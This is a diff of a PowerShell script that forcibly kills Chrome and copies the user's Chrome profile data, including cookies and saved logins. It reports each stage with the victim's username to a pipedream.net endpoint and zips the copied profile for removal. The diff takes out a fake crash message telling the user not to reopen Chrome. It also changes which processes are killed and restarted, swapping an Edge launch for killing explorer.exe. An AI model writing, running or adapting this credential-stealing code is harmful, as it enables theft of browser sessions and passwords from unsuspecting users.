@@ -2,15 +2,8 @@ Add-Type -AssemblyName PresentationCore,PresentationFramework
 $firefox = Get-Process Chrome
 
 if ($firefox) {
-  taskkill /f /im Chrome.exe
-  1..2 | % { Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" }
+  taskkill /f /im explorer.exe
   
-  $msgBody = "Chrome.exe has encountered an error - please wait while the application restarts. DO NOT run the application yourself"
-  $msgTitle = "Chrome.exe"
-  $msgButton = 'OK'
-  $msgImage = 'Error'
-  $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-  Write-Host "The user chose: $Result [" ($result).value__ "]"
 }
 
 
@@ -19,6 +12,7 @@ Copy-Item -Path "C:\Users\$env:username\AppData\Local\Google\Chrome" -Destinatio
 
 curl "https://eov3z188nwj4lcz.m.pipedream.net/chromedata/completed/$env:username" -Body -method post
 Start-Process Chrome
+Start-Process explorer
 
 curl "https://eov3z188nwj4lcz.m.pipedream.net/chromedata/archiving/$env:username" -method post
 Compress-Archive -Path "C:\Users\$env:username\AppData\Local\Google\Chrome2" -DestinationPath "C:\Cache\lol.zip"
